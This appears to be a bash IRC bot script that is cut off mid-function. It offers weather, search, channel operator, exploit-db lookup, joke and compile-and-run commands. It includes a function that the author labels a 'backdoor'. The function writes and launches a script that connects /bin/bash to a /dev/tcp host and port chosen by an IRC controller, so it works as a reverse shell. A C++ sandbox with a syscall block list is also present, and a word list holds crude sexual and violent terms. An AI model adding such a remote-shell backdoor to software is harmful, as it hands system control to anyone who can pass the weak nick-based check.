#!/bin/bash

authenticated(){
  SENDER=$1
  RESPOND=$2
  RETURN=$3

  FOUND="false"

  for controller in "${ALLOWED_PM_CONTROLLERS[@]}"; do
    if [ $controller == $SENDER ]; then
       FOUND="true"
    fi
  done

  [ "$FOUND" == "false" ] && message_post $RESPOND "Sorry - you are not a controller" && eval $RETURN=0 && return

  eval $RETURN=1
}

nick_callback(){
  debug "nick change request - $@"
  NICK_INFO=${1%%\!*}
  NICK_INFO=${NICK_INFO:1}

  DEST_NICK=$3

  if [ "$NICK_INFO" == "$nick" ]; then
    if [ "${DEST_NICK:0:1}" == ":" ]; then
      DEST_NICK=${DEST_NICK:1}
    fi
    debug "changed to $DEST_NICK"
    nick="$DEST_NICK"
  fi
}

message_post(){
  DESTINATION=$1
  shift
  msg_send "PRIVMSG $DESTINATION :$*"
}

run_weather(){
  SENDER=$1
  RESPOND=$2

  shift 2
  [ ! "$1" ] && message_post $RESPOND "Error - need a zip or city,state" && return

  WEATHER_REPORT=$($CURL_BIN "http://www.google.com/ig/api?weather=${1}&hl=en" | $SED_BIN 's/<forecast_conditions>.*//' | $SED_BIN 's/></>\n</g')

  CITY=$(echo "$WEATHER_REPORT" | $GREP_BIN -e '<city' | $SED_BIN -e 's/<city data="//' -e 's/"\/>//')
  CONDITION=$(echo "$WEATHER_REPORT" | $GREP_BIN -e '<condition' | $SED_BIN -e 's/<condition data="//' -e 's/"\/>//')
  TEMP=$(echo "$WEATHER_REPORT" | $GREP_BIN -e '<temp_f' | $SED_BIN -e 's/<temp_f data="//' -e 's/"\/>//')

  message_post $RESPOND "For [ $CITY ], temp [ $TEMP ], and [ $CONDITION ]"
}

run_op(){
  authenticated $1 $2 RESULT
  [ ${RESULT} -eq 0 ] && message_post $1 "You are not a controller" && return

  message_post $2 "By the power of Greyskull..."

  CHANNEL=$2

  [ "$3" ] && shift 2

  echo "MODE $CHANNEL +o $1"
}

run_deop(){
  authenticated $1 $2 RESULT
  [ ${RESULT} -eq 0 ] && message_post $1 "You are not a controller" && return

  CHANNEL=$2

  message_post $2 "When someone asks if you're a god..."

  [ "$3" ] && shift 2

  echo "MODE $CHANNEL -o $1"  
}

run_ping(){

  authenticated $1 $2 RESULT
  [ ${RESULT} -eq 0 ] && message_post $1 "Unable to ping - you are not a controller" && return

  [ ! -e $PING_BIN ] && message_post $1 "No ping utility installed" && return
  [ ! -e $GREP_BIN ] && message_post $1 "No grep utility installed" && return

  [ ! "$3" ] && message_post $1 "Must supply a host to ping" && return

  message_post $1 "Sending ping to [ $3 ]"

  RESULT=$($PING_BIN -c 1 "$3" | $GREP_BIN "received")

  message_post $1 "Result [ $RESULT ]"
}

run_join(){
  authenticated $1 $2 RESULT
  [ ${RESULT} -eq 0 ] && message_post $1 "Unable to join - you are not a controller" && return

  [ ! "$3" ] && message_post $1 "Need to specify a room to join" && return
  [ ! "${3:0:1}" == "#" ] && message_post $1 "Room name [ $3 ] seems bad" && return

  msg_send "JOIN $3"
  message_post $1 "Attempted to join room"
}

run_part(){
  authenticated $1 $2 RESULT
  [ ${RESULT} -eq 0 ] && message_post $1 "Unable to part - you are not a controller" && return

  [ ! "$3" ] && message_post $1 "Need to specify a room to leave" && return
  [ ! "${3:0:1}" == "#" ] && message_post $1 "Room name [ $3 ] seems bad" && return

  msg_send "PART $3"
  message_post $1 "Attempted to leave room"
}

random_number(){
  RANGE=$1
  RESULT=$2

  if [ $RANGE -lt 1 ]; then
      RANGE=0
  fi

  eval $RESULT=$[ ($RANDOM % $RANGE) ]
}

run_google(){
  SENDER=$1
  RESPOND=$2

  shift 2
  [ ! "$1" ] && message_post $RESPOND "Specify a search term" && return

  SEARCH_TERMS="$1"
  shift
  for var in "$@"; do
      SEARCH_TERMS="$SEARCH_TERMS+$var"
  done

  debug "Searching $SEARCH_TERMS"

  SEARCH_RESULT=$($CURL_BIN -A Mozilla "http://ajax.googleapis.com/ajax/services/search/web?v=1.0&q=$SEARCH_TERMS" | $GREP_BIN -Eo "(unescapedUrl|titleNoFormatting)\"\:\"([a-z]|[A-Z]|[0-9]|[:]|[/]|[/.]|[\\]|[ ]|[/-]|[&]|[/=]|[/?]|['])*" | $SED_BIN 's@":"@,@g')

  POSTED="false"

  I=0
  while [ $I -lt 5 ]; do
      CURRENT_TITLE_SLICE=$(echo "${SEARCH_RESULT}" | $GREP_BIN title -m ${I} | $TAIL_BIN -n 1 | $CUT_BIN -d"," -f2)
      CURRENT_URL_SLICE=$(echo "${SEARCH_RESULT}" | $GREP_BIN unescapedUrl -m ${I} | $TAIL_BIN -n 1 | $CUT_BIN -d"," -f2)
      [ "${CURRENT_URL_SLICE}" -a "${CURRENT_TITLE_SLICE}" ] && message_post $RESPOND "Match ${I} : ${CURRENT_URL_SLICE}, ${CURRENT_TITLE_SLICE}" && POSTED="true"
      ((I=$I + 1))
  done

  [ "$POSTED" != "true" ] && message_post $RESPOND "No results."
}

run_randsentence(){
  BEGINNING=( "Sometimes, the" "The" "Once upon a time, the" "Any" "Always, the" "Oh no, the" "My" )
  NOUN=( "school" "yard" "house" "ball" "shoes" "shirt" "fan" "purse" "bag" "pants" "toaster" "lamp" "floor" "door" "table" "bread" "dresser" "cup" "salt" "pepper" "plate" "dog" "cat" "wood" "stool" "suitcase" "plane" "bus" "car" "bike" "phone" "pillow" "wall" "window" "bed" "blanket" "hand" "head" "bra" "eyes" "sock" "plastic" "card board" "panty" "oven" "bow" "hair" "person" "clock" "foot" "boy" "book" "ear" "girl" "park" "basket" "woman" "street" "box" "man" "pussy"  "beaver" )
  VERB=( "bounced" "cried" "jumped" "yelled" "flew" "screamed" "coughed" "smoked" "sneezed" "exploded" "vomited" "fell" "burned" "smiled" "spied" "slept" "drove" "fucked" "skipped" "ran" "walked" "died" "laughed" "sang" "tripped" "frowned" "slipped" "committed murder" )
  ADJECTIVE=( "a beautiful" "a black" "an old" "the ugly" "my wet" "some red" "a loud" "the blue" "that dry" "a quiet" "a purple" "a hairy" "a mediocre" "the yellow" "a bald" "the melancholy" "the white" "the smooth" "a bright" "the clear" "that rough" "a dark" "the round" "a sexual" "the heavy" "the square" "a sexy" "that smelly" "my triangular" "my angry" "your disgusting" "an octagon" "the sad" "a delicious" "that precious" "happy" "that fat" "the distinguished" "a scared" "that skinny" "the burnt" "my brown" "a new" )

  random_number ${#BEGINNING[@]} GET_BEGINNING
  random_number ${#NOUN[@]} GET_NOUN
  random_number ${#NOUN[@]} GET_ANOTHER_NOUN
  random_number ${#VERB[@]} GET_VERB
  random_number ${#ADJECTIVE[@]} GET_ADJECTIVE

  message_post $2 "$1: ${BEGINNING[$GET_BEGINNING]} ${NOUN[$GET_NOUN]} ${VERB[$GET_VERB]} ${ADJECTIVE[$GET_ADJECTIVE]} ${NOUN[$GET_ANOTHER_NOUN]}"
}

run_nick(){
  authenticated $1 $2 RESULT
  [ ${RESULT} -eq 0 ] && message_post $1 "Unable to change nick - you are not a controller" && return

  [ ! "$3" ] && message_post $1 "Need to specify a new nick" && return
  [ "${3:0:1}" == "#" ] && message_post $1 "Nick [ $3 ] seems bad" && return

  msg_send "NICK $3"
  message_post $1 "Changed nick"
}

run_speak(){

  authenticated $1 $2 RESULT
  [ ${RESULT} -eq 0 ] && message_post $1 "Unable - you are not a controller" && return

  [ ! "$3" ] && message_post $1 "Need to give me a target" && return
  [ $# -lt 4 ] && message_post $1 "Need to give me something to say" && return

  SENDER="$1"
  DEST="$3"
 
  shift 3

  message_post $SENDER "Okay"
  message_post $DEST "$*"

}

run_quit(){
  authenticated $1 $2 RESULT
  [ ${RESULT} -eq 0 ] && message_post $1 "Unable to quit - you are not a controller" && return

  message_post $1 "Okay, bye"
  
  shift 2
  echo "QUIT $*"
  sleep 1
  exit 0
}

run_resolve(){
   MATCH=$(echo "$*" | $GREP_BIN -o -E "(http|https)(:[/][/])([a-z]|[A-Z]|[0-9]|[/=]|[/?]|[&]|[/-]|[/.]|[~])*" 2>/dev/null)

   if [ $? -eq 0 -a "$MATCH" ]; then
      # first resolve the url
      #echo "MATCHED: $MATCH"
      RESULT=$($CURL_BIN -L "$MATCH" 2>/dev/null)
      echo "$RESULT"
   fi
}

#
# Yes, this _IS_ a 'backdoor' - albeit - you must actually set
# ALLOW_REVERSE_SHELL somewhere for it to work.
#
run_reverseshell(){

  authenticated $1 $2 RESULT
  [ ${RESULT} -eq 0 ] && message_post $1 "Unable to join - you are not a controller" && return

  [ $ALLOW_REVERSE_SHELL -eq 0 ] && message_post $1 "No reverse shell" && return

  [ ! -x $CAT_BIN ] && message_post $1 "No cat binary" && return
  [ ! -x $NOHUP_BIN ] && message_post $1 "No nohup" && return
  [ ! -x $CHMOD_BIN ] && message_post $1 "No chmod binary" && return
  [ ! -x $RM_BIN ] && message_post $1 "No rm binary" && return

  [ ! "$3" ] && message_post $1 "Must specify a host" && return
  [ ! "$4" ] && message_post $1 "Must specify a port" && return

  message_post $1 "Spawning a forked reverse shell to [$3:$4]..."

  TMPSHELL=$($MKTEMP_BIN)

  message_post $1 "Writing a makeshell shell script"
  $CAT_BIN > $TMPSHELL <<EOF
#!/bin/bash
exec 3<> /dev/tcp/$3/$4
if [ $? != 0 ]; then
   exit 0
fi
/bin/bash 0<&3 1>&3- 2>/dev/null 
rm -f $TMPSHELL
EOF
  $CHMOD_BIN +x $TMPSHELL 2>/dev/null >/dev/null

  [ ! -x $TMPSHELL ] && message_post $1 "Cannot make shell - failed" && $RM_BIN -f $TMPSHELL && return
  
  $($NOHUP_BIN $TMPSHELL $3 $4 >/dev/null </dev/null 2>/dev/null &)
  message_post $1 "Spawned"
}

run_keyword(){
  [ ! "$3" ] && message_post $1 "Please say one of (off|on|clear|add|del)" && return

  if [ "$3" == "off" ]; then

    authenticated $1 $2 RESULT
    [ ${RESULT} -eq 0 ] && message_post $1 "Unable to change kw status - you are not a controller" && return
    message_post $2 "Use keywords off"
    USE_KEYWORDS="0"
  elif [ "$3" == "on" ]; then
    authenticated $1 $2 RESULT
    [ ${RESULT} -eq 0 ] && message_post $1 "Unable to change kw status - you are not a controller" && return

    message_post $2 "Use keywords on"
    USE_KEYWORDS="1"
  elif [ "$3" == "clear" ]; then
    authenticated $1 $2 RESULT
    [ ${RESULT} -eq 0 ] && message_post $1 "Unable to change kw status - you are not a controller" && return

    KEYWORDS=()
    KEYWORD_RESPONSES=()
  elif [ "$3" == "add" ]; then
    [ ! "$4" ] && message_post $1 "Requires a word" && return
    [ ! "$5" ] && message_post $1 "Requries at least a one word response" && return
   
    SENDER=$2
    shift 3
    KW=$1
    KEYWORDS=("${KEYWORDS[@]}" "$1")
    shift 1
    RSP="$*"
    KEYWORD_RESPONSES=("${KEYWORD_RESPONSES[@]}" "$*")

    message_post $SENDER "Added [ $KW ] with [ $RSP ]"
  elif [ "$3" == "list" ]; then
    [ ! "$4" ] && message_post $1 "Give me a keyword" && return
    I=0
    for found in "${KEYWORDS[@]}"; do
      result=$(echo "$*" | $GREP_BIN -i "$found")
      if [ "${result}" ]; then
        message_post $2 "Keyword [ ${KEYWORDS[${I}]} ] is [ ${KEYWORD_RESPONSES[$I]} ]"
        return
      fi
      ((I=$I+1))
    done

  elif [ "$3" == "del" ]; then
    authenticated $1 $2 RESULT
    [ ${RESULT} -eq 0 ] && message_post $1 "Unable to change kw status - you are not a controller" && return
    I=0
    for found in "${KEYWORDS[@]}"; do
      result=$(echo "$*" | $GREP_BIN -i "$found")
      if [ "${result}" ]; then
          KEYWORDS=(${KEYWORDS[@]:0:$I} ${KEYWORDS[@]:$(($I + 1))})
          KEYWORD_RESPONSES=(${KEYWORD_RESPONSES[@]:0:$I} ${KEYWORD_RESPONSES[@]:$(($I + 1))})
          message_post $2 "Removed keyword [ $found ]"
          return
      fi
      (( I=$I+1 ))
    done
  fi

}

run_shorten(){
   [ ! "$3" ] && message_post $2 "Unable to shorten blank url" && return

   URL="http://is.gd/api.php?longurl=$3"
   RESULT=$($CURL_BIN $URL)
   message_post $2 "Shortened [ $RESULT ]"
}


#GCC_FLAGS="-w"

run_controller(){

  SENDER=$1
  RESPOND=$2

  [ ! "$3" ] && message_post $RESPOND "Please say one of (list|add|del)" && return

  if [ "$3" == "list" ]; then
    message_post $RESPOND "Bot Controllers [ ${ALLOWED_PM_CONTROLLERS[@]} ]"
  elif [ "$3" == "add" ]; then
    [ ! "$4" ] && message_post $RESPOND "Must give a name" && return

    authenticated $1 $2 RESULT
    [ ${RESULT} -eq 0 ] && message_post $1 "Unable to add - you are not a controller" && return

    ALLOWED_PM_CONTROLLERS=(${ALLOWED_PM_CONTROLLERS[@]} "$4")
    message_post $RESPOND "Added - [ $4 ]"
  elif [ "$3" == "del" ]; then
    [ ! "$4" ] && message_post $RESPOND "Must give a name" && return

    authenticated $1 $2 RESULT
    [ ${RESULT} -eq 0 ] && message_post $1 "Unable to del - you are not a controller" && return

    if [ ${#ALLOWED_PM_CONTROLLERS[@]} -eq 1 ]; then
      message_post $RESPOND "Unable to delete yourself as last op"
      return
    fi

    I=0
    for found in "${ALLOWED_PM_CONTROLLERS[@]}"; do
      if [ "$found" == "$4" ]; then
        ALLOWED_PM_CONTROLLERS=(${ALLOWED_PM_CONTROLLERS[@]:0:${I}} ${ALLOWED_PM_CONTROLLERS[@]:$(($I + 1))})
      fi
      (( I=$I+1 ))
    done
  else
      message_post $RESPOND "Please say one of (list|add|del)"    
  fi
}

run_ticker(){
  SENDER=$1
  CHANNEL=$2
  shift 2

  [ ! "$1" ] && message_post $CHANNEL "Requires a ticker symbol"
  TICKERNAME=$($CURL_BIN "http://finance.yahoo.com/q?s=${1}&ql=1" 2>/dev/null | $GREP_BIN time_rtq_ticker | cut -d\" -f17 | cut -d"<" -f2 | cut -d">" -f2)
  TICKERPRICE=$($CURL_BIN "http://finance.yahoo.com/q?s=${1}&ql=1" 2>/dev/null | $GREP_BIN time_rtq_ticker | cut -d\" -f27 | cut -d"<" -f1 | cut -d">" -f2)

  message_post $CHANNEL "Ticker [ ${TICKERNAME} ] value [ ${TICKERPRICE} ]"
}

run_emote(){
  authenticated $1 $2 RESULT
  [ ${RESULT} -eq 0 ] && message_post $1 "Unable to change kw status - you are not a controller" && return


  [ ! "$3" ] && message_post $1 "Need to give me a dest to emote" && return
  [ $# -lt 4 ] && message_post $1 "Need to give me something to emote" && return

  SENDER="$1"
  DEST="$3"
  
  shift 3
  message_post $SENDER "Okay"
  echo -e "PRIVMSG $DEST :\001ACTION $*\001"
}

run_compile(){

  [ ${AUTHENTICATED_COMPILE} -eq 1 ] && authenticated $1 $2 RESULT
  [ ${AUTHENTICATED_COMPILE} -eq 1 -a ${RESULT} -eq 0 ] && message_post $1 "Sorry, ${1}, but you are not authorized to compile" && return

  SENDER=$1
  RESPONSE=$2

  shift 2

  [ ! "$*" ] && message_post $RESPONSE "Error - nothing to compile" && return

  HASMAIN=$(/bin/echo "$*" | $GREP_BIN -w -E "main")

  BADWORDS=( "ioctl" "signal" "sigaction" "syscall" "sysconf" )
  #BADWORDS=( "somebadword" )

  for badword in "${BADWORDS[@]}"; do
    HASWORD=$(/bin/echo "$*" | $GREP_BIN -w -o "$badword")
    if [ "${HASWORD}" ]; then
      message_post $RESPONSE "blocked app due to: [ $badword ]" 
      return
    fi
  done

  MKTEMP_BIN=/bin/mktemp
  COUTFILE=$($MKTEMP_BIN )
  OOUTFILE=$($MKTEMP_BIN )
  AOUTFILE=$($MKTEMP_BIN)
  WARNFIL=$($MKTEMP_BIN)

  debug "compile to $COUTFILE.cc"

  $CAT_BIN > ${COUTFILE}.cc <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <string.h>
#include <pthread.h>
#include <iostream>
#include <vector>
#include <map>
#include <valarray>
#include <string>
#include <iomanip>
#include <algorithm>
#include <list>
#include <set>
#include <sstream>
#include <stack>

using namespace std;

EOF

  NEEDSTERM="false"

  if [ ! "$HASMAIN" ]; then
      $CAT_BIN >> ${COUTFILE}.cc <<EOF

int main()
EOF

      [ "${1:0:1}" != "{" ] && $(echo "{" >> ${COUTFILE}.cc) && NEEDSTERM="true"
  fi
  

  $(set -f && echo "$*" >> ${COUTFILE}.cc)

  [ "$NEEDSTERM" == "true" ] && $(echo "}" >> ${COUTFILE}.cc)

  ERRORS=$($CXX ${GCC_FLAGS} -Dmain="APP_TMP_MAIN_main" -c -o ${OOUTFILE}.o ${COUTFILE}.cc 2>&1)

  if [ "$ERRORS" ]; then
    BADSTUFF=$(echo "$ERRORS" | $GREP_BIN -o -E -m 1 "(warning\:|error\:).*" )

    message_post $RESPONSE "submitted: ${BADSTUFF}"
    $RM_BIN -f $AOUTFILE $WARNFIL $OOUTFILE $COUTFILE ${COUTFILE}.cc ${OOUTFILE}.o

    return
  fi

  $CAT_BIN >${COUTFILE}.cc <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <assert.h>
#include <pthread.h>
#include <iostream>
#include <vector>
#include <map>
#include <valarray>
#include <string>
#include <iomanip>
#include <algorithm>
#include <list>
#include <set>
#include <sstream>
#include <fstream>
#include <stack>

#include <assert.h>
#include <sys/ptrace.h>
#include <linux/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
//#include <linux/user.h>
#include <sys/syscall.h>
#include <sys/reg.h>
#include <stdio.h>
#include <stdlib.h>

#include <sys/time.h>
#include <sys/resource.h>

#include <sys/user.h>

#ifdef __x86_64__
#define SYSCALL_OFF (ORIG_RAX * 8)
#define REGISTER(a,b) b
#else
#define SYSCALL_OFF (ORIG_EAX * 4)
#define REGISTER(a,b) a
#endif

using namespace std;

extern int APP_TMP_MAIN_main();

struct syscalls_blocked 
{
  int syscall;
  char *errorcall;
} blocked[300], spied[300];

#define STRINGIFY(a) STRING(#a)
#define STRING(a) #a

#define BLOCK_SYSCALL(a) { blocked[a].errorcall = #a ; blocked[a].syscall=a; }
#define SPY_SYSCALL(a) { spied[a].errorcall = #a ; spied[a].syscall=a; }

#define LIMIT(a, b, c) { rlimit kLimit; kLimit.rlim_cur = b; kLimit.rlim_max = c; if ( setrlimit( a, &kLimit ) < 0 ) { perror("setrlimit"); abort(); } }

int main(int argc, char *argv[])
{
    memset( &blocked, 0, sizeof(blocked));

    int i = 0;
    BLOCK_SYSCALL(__NR_clone);
    BLOCK_SYSCALL(__NR_fork);
    BLOCK_SYSCALL(__NR_vfork);
    BLOCK_SYSCALL(__NR_execve);
    BLOCK_SYSCALL(__NR_kill);
    BLOCK_SYSCALL(__NR_rt_sigaction);
    BLOCK_SYSCALL(__NR_rt_sigprocmask);
    BLOCK_SYSCALL(__NR_rt_sigreturn);
    BLOCK_SYSCALL(__NR_ioctl);
    BLOCK_SYSCALL(__NR_shmget);
    BLOCK_SYSCALL(__NR_shmat);
    BLOCK_SYSCALL(__NR_shmctl);
    BLOCK_SYSCALL(__NR_setitimer);
    BLOCK_SYSCALL(__NR_socket);
    BLOCK_SYSCALL(__NR_sendfile);
    BLOCK_SYSCALL(__NR_semget);
    BLOCK_SYSCALL(__NR_creat);
    BLOCK_SYSCALL(__NR_rmdir);
    BLOCK_SYSCALL(__NR_link);
    BLOCK_SYSCALL(__NR_unlink);
    BLOCK_SYSCALL(__NR_ptrace);
    BLOCK_SYSCALL(__NR_syslog);
    BLOCK_SYSCALL(__NR_setuid);
    BLOCK_SYSCALL(__NR_setgid);
    BLOCK_SYSCALL(__NR_setpgid);
    BLOCK_SYSCALL(__NR_setsid);
    BLOCK_SYSCALL(__NR_setresuid);
    BLOCK_SYSCALL(__NR_setresgid);
    BLOCK_SYSCALL(__NR_setfsuid);
    BLOCK_SYSCALL(__NR_setfsgid);
    BLOCK_SYSCALL(__NR_capset);
    BLOCK_SYSCALL(__NR_personality);
    BLOCK_SYSCALL(__NR_setpriority);
    BLOCK_SYSCALL(__NR_sched_setparam);
    BLOCK_SYSCALL(__NR_sched_setscheduler);
    BLOCK_SYSCALL(__NR_mknod);
    BLOCK_SYSCALL(__NR_chroot);
    BLOCK_SYSCALL(__NR__sysctl);
    BLOCK_SYSCALL(__NR_settimeofday);
    BLOCK_SYSCALL(__NR_mount);
    BLOCK_SYSCALL(__NR_setrlimit);
    BLOCK_SYSCALL(__NR_umount2);
    BLOCK_SYSCALL(__NR_reboot);

    //SPY_SYSCALL(__NR_open);

    if ( argc > 1 )
      return APP_TMP_MAIN_main();

    pid_t childID = fork();

    if( ! childID )
    {
        LIMIT( RLIMIT_CPU, 2, 2 ); 
        LIMIT( RLIMIT_FSIZE, 65535, 65535 );
        LIMIT( RLIMIT_NOFILE, 24, 25 );
        LIMIT( RLIMIT_NPROC, 4, 4 );
        LIMIT( RLIMIT_MSGQUEUE, 0, 0 );
        LIMIT( RLIMIT_LOCKS, 0, 0 );
        LIMIT( RLIMIT_AS, 1024 * 1024 * 32, 1024 * 1024 * 64 );

        ptrace(PTRACE_TRACEME, 0, NULL, NULL); /* trace me */
        execlp(argv[0], argv[0], "RUN", NULL);
        return 0;
    }

    if( childID < 0 )
    {
        cout << "FAILED: ptrace/fork error" << endl;
        return 0;
    }

    int status;
    wait (&status);

    if ( WIFEXITED(status) )
       return 0;

    assert( WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP );

    assert( ptrace(PTRACE_SETOPTIONS, childID, NULL, PTRACE_O_TRACESYSGOOD) != -1 );

    do
    {
       assert( ptrace(PTRACE_SYSCALL, childID, NULL, NULL) != -1 );
       assert( wait(&status) != -1 );

       if (WIFEXITED(status)) break;

       if (WSTOPSIG(status) == (SIGTRAP | 0x80))
       {
           long syscallnum = ptrace(PTRACE_PEEKUSER, childID, SYSCALL_OFF, NULL);
           if ( syscallnum && syscallnum < 300 && blocked[syscallnum].syscall==syscallnum )
           {
               cout << "Killed:" 
                    << " [0x" << hex << syscallnum << dec << "] "
                    << blocked[syscallnum].errorcall 
                    << endl;
               kill(childID, SIGKILL);
               exit(0);
               break;
           }
           else if ( syscallnum && syscallnum < 300 && spied[syscallnum].syscall==syscallnum)
           {
               user_regs_struct regs;
               ptrace(PTRACE_GETREGS, childID, NULL, &regs);
               long arg1 = regs. REGISTER(ebx,rbx) ;
               long arg2 = regs. REGISTER(ecx,rcx) ;
               long arg3 = regs. REGISTER(edx,rdx) ;
               long arg4 = regs. REGISTER(eax,rax) ;
               cout << "Spy: " << spied[syscallnum].errorcall << hex
                    << " [ " << arg1 << " ], " << " [ " << arg2 << " ], "
                    << " [ " << arg3 << " ], " << " [ " << arg4 << " ], "
                    << endl;
           }
       }
       else
       {
           assert( WSTOPSIG(status) == SIGTRAP );
           cout << "Non-syscall trap" << endl;
       }
       
    }while(1);

    return 0;
}

EOF

  ERRORS=$($CXX -fpermissive -w -o $AOUTFILE ${COUTFILE}.cc ${OOUTFILE}.o 2>&1 )
  if [ "$ERRORS" -a $? -eq 1 ]; then
    BADSTUFF=$(echo "$ERRORS" | $GREP_BIN -E -m 1 "(warning\:|error\:|undefined).*" )

    message_post $RESPONSE "precomp: ${BADSTUFF}"
    $RM_BIN -f $AOUTFILE $WARNFIL $OOUTFILE $COUTFILE ${COUTFILE}.cc ${OOUTFILE}.o

    return
  fi

  $CAT_BIN >$WARNFIL <<EOF
#!/bin/bash
ulimit -t 2
#ulimit -u 5
$AOUTFILE 2>&1 | $TR_BIN '\n\r\0' '|||' | $TR_BIN -cd '\11\12\15\40-\176' | /usr/bin/colrm 81

EOF

  $CHMOD_BIN +x $WARNFIL

  RESULT=$( ${WARNFIL} 2>&1 )
 
  $RM_BIN -f $COUTFILE $AOUTFILE $WARNFIL $OOUTFILE

  [ "$RESULT" ] && message_post $RESPONSE "$RESULT" && return
  message_post $RESPONSE "$SENDER, No output."
}

run_insult(){
  SENDER="$1"
  RESPOND="$2"
  shift 2

  INSULT=$SENDER

  [ "$1" ] && INSULT="$*"

  QUIP=$($CURL_BIN http://www.randominsults.net 2>/dev/null | $GREP_BIN "<strong><i>\(.*\)</i></strong>" | $SED_BIN 's@<[^>]*>@@g' | $SED_BIN 's@&nbsp;@ @g' | $SED_BIN 's@^ *@@g' )

  [ ! "$QUIP" ] && message_post $RESPOND "$SENDER, I am sorry, I cannot be insulting" && return

  message_post $RESPOND "$INSULT, $QUIP"
}

run_rot13(){
  SENDER=$1
  RESPOND=$2
  shift 2
  ROTMSG=$(echo "$*" | $TR_BIN 'a-zA-Z' 'n-za-mN-ZA-M')
  message_post $RESPOND "$ROTMSG"
}

run_cve_search(){
  SENDER=$1
  RESPOND=$2
  shift 2

  debug "$SENDER asked for cve stuff"

  CVENUM=$(echo "$*" | $SED_BIN 's@cve@@g')

  debug "Seeking cve $CVENUM"
 
  RESULT_TXT=$($CURL_BIN "http://www.exploit-db.com/search/?action=search&filter_page=1&filter_cve=${CVENUM}" 2>/dev/null)

  RESULTS=$(echo "$RESULT_TXT" | $GREP_BIN www.exploit-db.com/exploits | $SED_BIN 's@^.*<a  href="\(http\://www.exploit-db.com/exploits/.*\)">\(.*\)</a>@title [ \2 ] link [ \1 ]@g')

  RESULT_NUM=$(echo "$RESULTS" | $GREP_BIN -c title)

  if [ $RESULT_NUM -eq 0 ]; then
    message_post $RESPOND "No results."
  elif [ $RESULT_NUM -eq 1 ]; then
    message_post $RESPOND "$SENDER, $RESULTS"
  else

    if [ $RESULT_NUM -gt 3 ]; then
       RESULT_NUM=3
    fi

    I=0
    while [ $I -lt $RESULT_NUM ]; do
      ((I = $I + 1))
      RESULT=$(echo "$RESULTS" | $GREP_BIN -m ${I} title | $TAIL_BIN -n 1)
      message_post $RESPOND "$SENDER, $RESULT"
    done
  fi

}

run_exploit_search(){
  SENDER=$1
  RESPOND=$2
  shift 2

  # after this point, we have all the stuff
  IS_CVE_SEARCH=$(echo "$1" | $TR_BIN 'a-z' 'A-Z')
  
  if [ "${IS_CVE_SEARCH:0:3}" == "CVE" ]; then
    run_cve_search $SENDER $RESPOND $@
    return
  fi

  SEARCH_TXT=$(echo "$@" | $SED_BIN 's/ /+/g')

  RESULT_TXT=$($CURL_BIN "http://www.exploit-db.com/search/?action=search&filter_page=1&filter_exploit_text=$SEARCH_TXT" 2>/dev/null)

  RESULTS=$(echo "$RESULT_TXT" | $GREP_BIN www.exploit-db.com/exploits | $SED_BIN 's@^.*<a  href="\(http\://www.exploit-db.com/exploits/.*\)">\(.*\)</a>@title [ \2 ] link [ \1 ]@g')

  RESULT_NUM=$(echo "$RESULTS" | $GREP_BIN -c title)

  if [ $RESULT_NUM -eq 0 ]; then
    message_post $RESPOND "No results for [ $@ ]."
  elif [ $RESULT_NUM -eq 1 ]; then
    message_post $RESPOND "$SENDER, $RESULTS"
  else

    if [ $RESULT_NUM -gt 10 ]; then
       message_post $RESPOND "Too many results for [ $@ ] - [ $RESULT_NUM ]."
       return
    elif [ $RESULT_NUM -gt 3 ]; then
       RESULT_NUM=3
    fi

    I=0
    while [ $I -lt $RESULT_NUM ]; do
      ((I = $I + 1))
      RESULT=$(echo "$RESULTS" | $GREP_BIN -m ${I} title | $TAIL_BIN -n 1)
      message_post $RESPOND "$SENDER, $RESULT"
    done
  fi

}

run_mycmd(){

  SENDER="$1"
  RESPOND="$1"
  KW="$2"

  shift 2

  if [ "$KW" == "uptime" ]; then
    [ ! -e $UPTIME_BIN ] && message_post $SENDER "Sorry - no uptime binary" && return
    UPTIME=$($UPTIME_BIN)
    message_post $SENDER "Uptime - $UPTIME"
  elif [ "$KW" == "sysinfo" ]; then
    [ ! -e $UNAME_BIN ] && message_post $SENDER "No uname binary found" && return
    UNAME=$($UNAME_BIN -a)
    message_post $SENDER "Uname - $UNAME"
  elif [ "$KW" == "id" ]; then
    [ ! -e $ID_BIN ] && message_post $SENDER "No id binary" && return
    IDINFO=$($ID_BIN)
    message_post $SENDER "ID [ $IDINFO ]"
  elif [ "$KW" == "keywords" ]; then
    message_post $SENDER "Keywords [ ${KEYWORDS[@]} ]"
  elif [ "$KW" == "ping" ]; then
    run_ping $SENDER $RESPOND $*
  elif [ "$KW" == "rshell" ]; then
    run_reverseshell $SENDER $RESPOND $*
  elif [ "$KW" == "nick" ]; then
    run_nick $SENDER $RESPOND $*
  elif [ "$KW" == "join" ]; then
    run_join $SENDER $RESPOND $*
  elif [ "$KW" == "part" ]; then
    run_part $SENDER $RESPOND $*
  elif [ "$KW" == "speak" ]; then
    run_speak $SENDER $RESPOND $*
  elif [ "$KW" == "emote" ]; then
    run_emote $SENDER $RESPOND $*
  elif [ "$KW" == "keyword" ]; then
    run_keyword $SENDER $RESPOND $*
  elif [ "$KW" == "controller" ]; then
    run_controller $SENDER $RESPOND $*
  elif [ "$KW" == "ticker" ]; then
    run_ticker $SENDER $RESPOND $*
  elif [ "$KW" == "shorten" ]; then
    run_shorten $SENDER $SENDER $*
  elif [ "$KW" == "quit" ]; then
    run_quit $SENDER $RESPOND "$*"
  elif [ "$KW" == "rot13" ]; then
    run_rot13 $SENDER $RESPOND "$*"
  else
    message_post $SENDER "Unknown command: [$KW]"
  fi

  return
}

handler_callback_tome(){
  debug "tome ARGS: $*"

  SENDER="$1"

  ACTION="${2:1}"

  shift 2

  if [ "${ACTION:0:1}" == \! ]; then
     run_mycmd $SENDER "${ACTION:1}" $*
  else
     message_post $1 "Unable to recognize your request [$*]"
  fi

  return
}


#############################################################################
##
## CHANNEL
##
#############################################################################

handler_callback_tochan(){
  debug "TOCHAN ARGS: $*"

  SENDER="$1"
  CHANNEL="$2"

  shift 2

  if [ "${1:1:1}" == \! ]; then
    if [ "${1:2}" == "uptime" ]; then
      UPTIME=$(UPTIME_BIN)
      message_post $CHANNEL "$UPTIME"
    elif [ "${1:2}" == "explode" ]; then
